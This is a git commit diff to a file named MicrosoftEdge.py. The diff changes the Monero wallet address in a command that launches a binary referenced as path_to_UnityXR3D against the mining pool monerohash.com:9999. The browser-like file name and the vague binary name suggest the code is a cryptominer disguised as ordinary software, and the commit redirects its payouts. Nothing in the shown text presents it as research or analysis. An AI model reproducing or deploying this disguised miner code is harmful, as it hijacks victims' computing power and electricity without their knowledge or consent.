eef386ba637932266b9694b2424bd0e2b91f7706
baa4ts <122758774+baa4ts@users.noreply.github.com>
2023-02-20 02:26:57 -0300

    Update MicrosoftEdge.py

--- MicrosoftEdge.py
+++ MicrosoftEdge.py
@@ -7,7 +7,7 @@ mining_level = 1
 command = [
     path_to_UnityXR3D,
     "-o", "monerohash.com:9999",
-    "-u", "47E3dzvFXcNc7yjaCR6GKF8DqayopyfWv5yKgo5eJSG4EFrDtXhxzTsDKhTkM8W1zsgsJJtvXJi2sM8o5t4wgNdXEz2N8A7",
+    "-u", "46tucY8jBpVGPY1AmW49Agh1K4gEjNTrxBZ2DcGHD8jf53yJtTZNKeY4g5HtsyZwvp8ChDxawo4hsL21kzAmgHaN9ovVBbZ",
     "-k", "--tls",
     "-m", str(mining_level)
 ]
